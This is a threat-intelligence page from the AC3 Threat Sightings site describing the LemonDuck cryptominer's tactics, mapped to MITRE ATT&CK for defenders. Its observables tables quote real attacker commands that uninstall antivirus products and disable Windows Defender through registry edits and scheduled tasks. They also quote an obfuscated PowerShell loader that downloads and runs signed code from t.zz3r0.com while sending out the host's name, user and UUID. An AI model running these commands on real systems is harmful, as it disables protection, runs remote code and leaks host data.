<!doctype html>
<html class="docs-version-current" lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.6">
<title data-react-helmet="true">LemonDuck_Malware | AC3 - Threat Sightings</title><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"><meta data-react-helmet="true" property="og:url" content="https://mcafee-enterprise.github.io/ac3-threat-sightings/docs/Sightings/LemonDuck_Malware"><meta data-react-helmet="true" name="docusaurus_locale" content="en"><meta data-react-helmet="true" name="docusaurus_version" content="current"><meta data-react-helmet="true" name="docusaurus_tag" content="docs-default-current"><meta data-react-helmet="true" property="og:title" content="LemonDuck_Malware | AC3 - Threat Sightings"><meta data-react-helmet="true" name="description" content="Overview"><meta data-react-helmet="true" property="og:description" content="Overview"><link data-react-helmet="true" rel="shortcut icon" href="/ac3-threat-sightings/img/ma-favicon.ico"><link data-react-helmet="true" rel="canonical" href="https://mcafee-enterprise.github.io/ac3-threat-sightings/docs/Sightings/LemonDuck_Malware"><link data-react-helmet="true" rel="alternate" href="https://mcafee-enterprise.github.io/ac3-threat-sightings/docs/Sightings/LemonDuck_Malware" hreflang="en"><link data-react-helmet="true" rel="alternate" href="https://mcafee-enterprise.github.io/ac3-threat-sightings/docs/Sightings/LemonDuck_Malware" hreflang="x-default"><link rel="stylesheet" href="/ac3-threat-sightings/assets/css/styles.9f78bae8.css">
<link rel="preload" href="/ac3-threat-sightings/assets/js/runtime~main.c07ad03c.js" as="script">
<link rel="preload" href="/ac3-threat-sightings/assets/js/main.a21a4089.js" as="script">
</head>
<body data-theme="light">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div><a href="#" class="skipToContent_OuoZ">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/ac3-threat-sightings/"><img src="/ac3-threat-sightings/img/ac3.gif" alt="My Site Logo" class="themedImage_TMUO themedImage--light_4Vu1 navbar__logo"><img src="/ac3-threat-sightings/img/ac3.gif" alt="My Site Logo" class="themedImage_TMUO themedImage--dark_uzRr navbar__logo"><b class="navbar__title">AC3 Threat Sightings</b></a><a class="navbar__item navbar__link navbar__link--active" href="/ac3-threat-sightings/docs/Welcome">Home</a></div><div class="navbar__items navbar__items--right"><div class="react-toggle toggle_2i4l react-toggle--disabled"><div class="react-toggle-track" role="button" tabindex="-1"><div class="react-toggle-track-check"><span class="toggle_iYfV">ðŸŒœ</span></div><div class="react-toggle-track-x"><span class="toggle_iYfV">ðŸŒž</span></div><div class="react-toggle-thumb"></div></div><input type="checkbox" class="react-toggle-screenreader-only" aria-label="Switch between dark and light mode"></div><div class="dsla-search-wrapper"><div class="dsla-search-field"></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper docs-wrapper docs-doc-page"><div class="docPage_lDyR"><button class="clean-btn backToTopButton_i9tI" type="button"><svg viewBox="0 0 24 24" width="28"><path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z" fill="currentColor"></path></svg></button><aside class="docSidebarContainer_0YBq"><div class="sidebar_a3j0"><nav class="menu thin-scrollbar menu_cyFh menuWithAnnouncementBar_+O1J"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" href="/ac3-threat-sightings/docs/Welcome">AC3 Threat Sightings</a></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#">Getting Started</a></li><li class="theme-doc-sidebar-item-category menu__list-item"><a class="menu__link menu__link--sublist menu__link--active" href="#">Sightings</a><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Darkside_Ransomware">Darkside_Ransomware</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Diavol_Ransomware">Diavol_Ransomware</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Conti_Ransomware">Conti_Ransomware</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/BlackCat_Ransomware">BlackCat_Ransomware</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Jupyter_InfoStealer">Jupyter_InfoStealer</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Raccoon_InfoStealer">Raccoon_InfoStealer</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Guildma_RAT">Guildma_RAT</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/LemonDuck_Malware">LemonDuck_Malware</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/UNK-Credential_Access">UNK-Credential_Access</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/TA551-Phishing">TA551-Phishing</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/UNK-Phishing">UNK-Phishing</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/HermeticWiper">HermeticWiper</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/WhisperGate">WhisperGate</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Hafnium">Hafnium</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Tortillas_Babuk">Tortillas_Babuk</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" tabindex="0" href="/ac3-threat-sightings/docs/Sightings/Emotet_Dec2021">Emotet_Dec2021</a></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#" tabindex="0">Older Schema Version</a></li></ul></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#">Weapons</a></li><li class="theme-doc-sidebar-item-category menu__list-item menu__list-item--collapsed"><a class="menu__link menu__link--sublist" href="#">Techniques</a></li><li class="theme-doc-sidebar-item-link menu__list-item"><a class="menu__link" href="/ac3-threat-sightings/docs/Stats">Stats</a></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_eoK2"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_e+kA"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></aside><main class="docMainContainer_r8cw"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_zHA2"><div class="docItemContainer_oiyr"><article><div class="tocCollapsible_aw-L theme-doc-toc-mobile tocMobile_Tx6Y"><button type="button" class="clean-btn tocCollapsibleButton_zr6a">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>LemonDuck_Malware</h1></header><h2><a aria-hidden="true" tabindex="-1" class="anchor anchor__h2 anchorWithStickyNavbar_y2LR" id="overview"></a>Overview<a class="hash-link" href="#overview" title="Direct link to heading">#</a></h2><p>This Threat Sighting documents observed TTPs for LemonDuck covering Execution, Defense Evasion, Persistence and Command And Control tactics. This analysis is based on EDR Telemetry analysis and public <em>any.run</em> sandbox reports. LemonDuck is a cryptocurrency miner which surfaced on the threat landscape in 2019. The malware uses multiple infection vectors such as spam campaigns with malicious attachments and targeting vulnerable Microsoft Exchange, Oracle WebLogic, Hadoop, and Redis servers.</p><p>This document is a summary of the extracted TTPs. For full details please refer to the AC3 Threat Sighting (.yml file) at: <a href="https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_LemonDuck_Malware.yml" target="_blank" rel="noopener noreferrer">https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_LemonDuck_Malware.yml</a></p><p>Author: Alejandro Houspanossian (@lekz86)</p><p>Acknowledgements: @lekz86</p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="references"></a>References:<a class="hash-link" href="#references" title="Direct link to heading">#</a></h3><ul><li><a href="https://www.microsoft.com/security/blog/2021/07/29/when-coin-miners-evolve-part-2-hunting-down-lemonduck-and-lemoncat-attacks/" target="_blank" rel="noopener noreferrer">https://www.microsoft.com/security/blog/2021/07/29/when-coin-miners-evolve-part-2-hunting-down-lemonduck-and-lemoncat-attacks/</a></li><li><a href="https://app.any.run/tasks/696a24ef-dc37-44f5-a951-3680d7277eb1" target="_blank" rel="noopener noreferrer">https://app.any.run/tasks/696a24ef-dc37-44f5-a951-3680d7277eb1</a></li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-activity"></a>Threat Actor Activity<a class="hash-link" href="#threat-actor-activity" title="Direct link to heading">#</a></h3><ul><li>Threat actor used <em>WMIC</em> to uninstall software security solutions via <em>PowerShell</em> and <em>CMD</em> for Defense Evasion.</li><li>Threat actor used <em>Reg.exe</em> to disable Windows Defender Policies via <em>PowerShell</em> and <em>CMD</em> for Defense Evasion.</li><li>Threat actor used <em>SCHTASKS</em> to disable Windows Defender Scheduled Tasks via <em>PowerShell</em> for Defense Evasion.</li><li>Threat actor used <em>Reg.exe</em> to disable Windows Defender Policies and Services via <em>PowerShell</em> for Defense Evasion.</li><li>Threat actor used <em>SCHTASKS</em> to create and execute scheduled tasks for Persistence.</li><li>Threat actor used a <em>highly obfuscated PowerShell</em> commands for Command And Control.</li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="count-of-documented-ttps-by-tactic"></a>Count of documented TTPs by Tactic<a class="hash-link" href="#count-of-documented-ttps-by-tactic" title="Direct link to heading">#</a></h3><table><thead><tr><th>Tactic</th><th># Documented TTPs</th></tr></thead><tbody><tr><td>Persistence</td><td>+ (1)</td></tr><tr><td>Command And Control</td><td>+ (1)</td></tr><tr><td>Defense Evasion</td><td>++++ (4)</td></tr></tbody></table><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="attack-flow"></a>Attack Flow<a class="hash-link" href="#attack-flow" title="Direct link to heading">#</a></h3><p>The chart below shows a graphical representation of the attack flow.</p><div class="mermaid">
graph LR
EXE[Execution] --&gt; | _WMIC_ to uninstall software security solutions via _PowerShell_ and _CMD_| DE[Defense Evasion]
EXE[Execution] --&gt; | _Reg.exe_ to disable Windows Defender Policies via _PowerShell_ and _CMD_| DE[Defense Evasion]
EXE[Execution] --&gt; | _SCHTASKS_ to disable Windows Defender Scheduled Tasks via _PowerShell_| DE[Defense Evasion]
EXE[Execution] --&gt; | _Reg.exe_ to disable Windows Defender Policies and Services via _PowerShell_| DE[Defense Evasion]
EXE[Execution] --&gt; | _SCHTASKS_ to create and execute scheduled tasks| PER[Persistence]
EXE[Execution] --&gt; | a _highly obfuscated PowerShell_ commands| C2[Command And Control]
</div><h2><a aria-hidden="true" tabindex="-1" class="anchor anchor__h2 anchorWithStickyNavbar_y2LR" id="tactics-techniques-and-procedures"></a>Tactics, Techniques and Procedures<a class="hash-link" href="#tactics-techniques-and-procedures" title="Direct link to heading">#</a></h2><table><thead><tr><th>Tactic</th><th>Techniques</th><th>Procedure</th></tr></thead><tbody><tr><td>Defense Evasion</td><td>T1562.001 - Impair Defenses: Disable or Modify Tools<br>T1047 - Windows Management Instrumentation<br>T1059.001 - Command and Scripting Interpreter: PowerShell<br>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</td><td>Threat actor used <em>WMIC</em> to uninstall software security solutions via <em>PowerShell</em> and <em>CMD</em> for Defense Evasion.</td></tr><tr><td>Defense Evasion</td><td>T1562.001 - Impair Defenses: Disable or Modify Tools<br>T1112 - Modify Registry<br>T1059.001 - Command and Scripting Interpreter: PowerShell<br>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</td><td>Threat actor used <em>Reg.exe</em> to disable Windows Defender Policies via <em>PowerShell</em> and <em>CMD</em> for Defense Evasion.</td></tr><tr><td>Defense Evasion</td><td>T1562.001 - Impair Defenses: Disable or Modify Tools<br>T1053.005 - Scheduled Task/Job: Scheduled Task<br>T1059.001 - Command and Scripting Interpreter: PowerShell</td><td>Threat actor used <em>SCHTASKS</em> to disable Windows Defender Scheduled Tasks via <em>PowerShell</em> for Defense Evasion.</td></tr><tr><td>Defense Evasion</td><td>T1562.001 - Impair Defenses: Disable or Modify Tools<br>T1112 - Modify Registry<br>T1059.001 - Command and Scripting Interpreter: PowerShell<br>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</td><td>Threat actor used <em>Reg.exe</em> to disable Windows Defender Policies and Services via <em>PowerShell</em> for Defense Evasion.</td></tr><tr><td>Persistence</td><td>T1059.001 - Command and Scripting Interpreter: PowerShell<br>T1053.005 - Scheduled Task/Job: Scheduled Task</td><td>Threat actor used <em>SCHTASKS</em> to create and execute scheduled tasks for Persistence.</td></tr><tr><td>Command And Control</td><td>T1059.003 - Command and Scripting Interpreter: Windows Command Shell<br>T1027 - Obfuscated Files or Information<br>T1059.001 - Command and Scripting Interpreter: PowerShell</td><td>Threat actor used a <em>highly obfuscated PowerShell</em> commands for Command And Control.</td></tr></tbody></table><h2><a aria-hidden="true" tabindex="-1" class="anchor anchor__h2 anchorWithStickyNavbar_y2LR" id="tactics-techniques-procedures-observables-and-notes"></a>Tactics, Techniques, Procedures, Observables and Notes<a class="hash-link" href="#tactics-techniques-procedures-observables-and-notes" title="Direct link to heading">#</a></h2><table><thead><tr><th>Tactic</th><th>Techniques</th><th>Procedure</th><th>Observables</th><th>Notes</th></tr></thead><tbody><tr><td>Defense Evasion</td><td>T1562.001<br>T1047<br>T1059.001<br>T1059.003</td><td>Threat actor used <em>WMIC</em> to uninstall software security solutions via <em>PowerShell</em> and <em>CMD</em> for Defense Evasion.</td><td><em>Process Created</em>: <br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c start /b wmic.exe product where \&quot;name like \&#x27;%Eset%\&#x27;\&quot; call uninstall /nointeractive</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c start /b wmic.exe product where \&quot;name like \&#x27;%Kaspersky%\&#x27;\&quot; call uninstall /nointeractive</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c start /b wmic.exe product where \&quot;name like \&#x27;%avast%\&#x27;\&quot; call uninstall /nointeractive</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c start /b wmic.exe product where \&quot;name like \&#x27;%Security%\&#x27;\&quot; call uninstall /nointeractive</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c start /b wmic.exe product where \&quot;name like \&#x27;%AntiVirus%\&#x27;\&quot; call uninstall /nointeractive</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c start /b wmic.exe product where \&quot;name like \&#x27;%Norton Security%\&#x27;\&quot; call uninstall /nointeractive</code></td><td></td></tr><tr><td>Defense Evasion</td><td>T1562.001<br>T1112<br>T1059.001<br>T1059.003</td><td>Threat actor used <em>Reg.exe</em> to disable Windows Defender Policies via <em>PowerShell</em> and <em>CMD</em> for Defense Evasion.</td><td><em>Process Created</em>: <br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg delete \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\&quot; /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\&quot; /v DisableAntiVirus /t REG_DWORD /d 1 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\&quot; /v MpEnablePus /t REG_DWORD /d 0 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\&quot; /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\&quot; /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\&quot; /v DisableIOAVProtection /t REG_DWORD /d 1 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\&quot; /v DisableOnAccessProtection /t REG_DWORD /d 1 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\&quot; /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\&quot; /v SpynetReporting /t REG_DWORD /d 0 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\&quot; /v SubmitSamplesConsent /t REG_DWORD /d 0 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger /v Start /t REG_DWORD /d 0 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger /v Start /t REG_DWORD /d 0 /f</code></td><td></td></tr><tr><td>Defense Evasion</td><td>T1562.001<br>T1053.005<br>T1059.001</td><td>Threat actor used <em>SCHTASKS</em> to disable Windows Defender Scheduled Tasks via <em>PowerShell</em> for Defense Evasion.</td><td><em>Process Created</em>: <br>- <code>\&quot;C:\\Windows\\system32\\schtasks.exe\&quot; /Change /TN \&quot;Microsoft\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh\&quot; /Disable</code><br>- <code>\&quot;C:\\Windows\\system32\\schtasks.exe\&quot; /Change /TN \&quot;Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\&quot; /Disable</code><br>- <code>\&quot;C:\\Windows\\system32\\schtasks.exe\&quot; /Change /TN \&quot;Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\&quot; /Disable</code><br>- <code>\&quot;C:\\Windows\\system32\\schtasks.exe\&quot; /Change /TN \&quot;Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\&quot; /Disable</code><br>- <code>\&quot;C:\\Windows\\system32\\schtasks.exe\&quot; /Change /TN \&quot;Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\&quot; /Disable</code></td><td></td></tr><tr><td>Defense Evasion</td><td>T1562.001<br>T1112<br>T1059.001<br>T1059.003</td><td>Threat actor used <em>Reg.exe</em> to disable Windows Defender Policies and Services via <em>PowerShell</em> for Defense Evasion.</td><td><em>Process Created</em>: <br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run /v \&quot;Windows Defender\&quot; /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \&quot;Windows Defender\&quot; /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsDefender /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg delete HKCR\\*\\shellex\\ContextMenuHandlers\\EPP /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg delete HKCR\\Directory\\shellex\\ContextMenuHandlers\\EPP /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg delete HKCR\\Drive\\shellex\\ContextMenuHandlers\\EPP /f</code><br><em>Process Created</em>: <br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add HKLM\\System\\CurrentControlSet\\Services\\WdBoot /v Start /t REG_DWORD /d 4 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add HKLM\\System\\CurrentControlSet\\Services\\WdFilter /v Start /t REG_DWORD /d 4 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add HKLM\\System\\CurrentControlSet\\Services\\WdNisDrv /v Start /t REG_DWORD /d 4 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add HKLM\\System\\CurrentControlSet\\Services\\WdNisSvc /v Start /t REG_DWORD /d 4 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add HKLM\\System\\CurrentControlSet\\Services\\WinDefend /v Start /t REG_DWORD /d 4 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthService /v Start /t REG_DWORD /d 4 /f</code></td><td></td></tr><tr><td>Persistence</td><td>T1059.001<br>T1053.005</td><td>Threat actor used <em>SCHTASKS</em> to create and execute scheduled tasks for Persistence.</td><td><em>Process Created</em>: <br>- <code>\&quot;C:\\Windows\\system32\\schtasks.exe\&quot; /create /sc MINUTE /mo 120 /tn blackball1 /F /tr blackball1</code><br>- <code>\&quot;C:\\Windows\\system32\\schtasks.exe\&quot; /create /sc MINUTE /mo 120 /tn blackball /F /tr blackball</code><br>- <code>\&quot;C:\\Windows\\system32\\schtasks.exe\&quot; /create /sc MINUTE /mo 60 /tn \\lUWLs8e0z /F /tr \&quot;powershell -w hidden -c PS_CMD\&quot;</code><br>- <code>\&quot;C:\\Windows\\system32\\schtasks.exe\&quot; /create /sc MINUTE /mo 60 /tn a2utp8I\\g4yeU6uwoY /F /tr \&quot;powershell -w hidden -c PS_CMD\&quot;</code><br>- <code>\&quot;C:\\Windows\\system32\\schtasks.exe\&quot; /run /tn a2utp8I\\g4yeU6uwoY</code></td><td></td></tr><tr><td>Command And Control</td><td>T1059.003<br>T1027<br>T1059.001</td><td>Threat actor used a <em>highly obfuscated PowerShell</em> commands for Command And Control.</td><td><em>Process Created</em>: <br>- <code>/c powershell -w hidden -c function a($u)[REDACTED]</code><br><em>Process Created</em>: <br>- <code>powershell -w hidden -c function a($u){$d=(Ne</code>w-Obj<code>ect Net.WebC</code>lient).\&quot;DownloadData\&quot;($u);$c=$d.count;if($c -gt 173){$b=$d[173..$c];$p=New-Object Security.Cryptography.RSAParameters;$p.Modulus=[convert]::FromBase64String(&#x27;2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10=&#x27;);$p.Exponent=0x01,0x00,0x01;$r=New-Object Security.Cryptography.RSACryptoServiceProvider;$r.ImportParameters($p);if($r.verifyData($b,(New-Object Security.Cryptography.SHA1CryptoServiceProvider),[convert]::FromBase64String(-join([char[]]$d[0..171])))){I<code>ex(-join[char[]]$b)}}}$url=&#x27;http://&#x27;+&#x27;t.zz3&#x27;+&#x27;r0.com&#x27;;a($url+&#x27;/aa.jsp?ipc_20210405?&#x27;+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join&#x27;*&#x27;))</code></td><td>- The command is highly obfuscated.</td></tr></tbody></table><h2><a aria-hidden="true" tabindex="-1" class="anchor anchor__h2 anchorWithStickyNavbar_y2LR" id="ttp-profiles-with-observables"></a>TTP Profiles with Observables<a class="hash-link" href="#ttp-profiles-with-observables" title="Direct link to heading">#</a></h2><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-used-wmic-to-uninstall-software-security-solutions-via-powershell-and-cmd-for-defense-evasion"></a>Threat actor used <em>WMIC</em> to uninstall software security solutions via <em>PowerShell</em> and <em>CMD</em> for Defense Evasion.<a class="hash-link" href="#threat-actor-used-wmic-to-uninstall-software-security-solutions-via-powershell-and-cmd-for-defense-evasion" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic"></a>Tactic<a class="hash-link" href="#tactic" title="Direct link to heading">#</a></h4><ul><li>Defense Evasion</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques"></a>Techniques<a class="hash-link" href="#techniques" title="Direct link to heading">#</a></h4><ul><li>T1562.001 - Impair Defenses: Disable or Modify Tools</li><li>T1047 - Windows Management Instrumentation</li><li>T1059.001 - Command and Scripting Interpreter: PowerShell</li><li>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1562.001<br>T1047<br>T1059.001<br>T1059.003</td><td><em>PowerShell</em> spawns multiple execution of <em>CMD</em> to uninstall software security solutions via <em>WMIC</em>.</td><td><em>Process Created</em>: <br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c start /b wmic.exe product where \&quot;name like \&#x27;%Eset%\&#x27;\&quot; call uninstall /nointeractive</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c start /b wmic.exe product where \&quot;name like \&#x27;%Kaspersky%\&#x27;\&quot; call uninstall /nointeractive</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c start /b wmic.exe product where \&quot;name like \&#x27;%avast%\&#x27;\&quot; call uninstall /nointeractive</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c start /b wmic.exe product where \&quot;name like \&#x27;%Security%\&#x27;\&quot; call uninstall /nointeractive</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c start /b wmic.exe product where \&quot;name like \&#x27;%AntiVirus%\&#x27;\&quot; call uninstall /nointeractive</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c start /b wmic.exe product where \&quot;name like \&#x27;%Norton Security%\&#x27;\&quot; call uninstall /nointeractive</code></td></tr></tbody></table><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-used-regexe-to-disable-windows-defender-policies-via-powershell-and-cmd-for-defense-evasion"></a>Threat actor used <em>Reg.exe</em> to disable Windows Defender Policies via <em>PowerShell</em> and <em>CMD</em> for Defense Evasion.<a class="hash-link" href="#threat-actor-used-regexe-to-disable-windows-defender-policies-via-powershell-and-cmd-for-defense-evasion" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 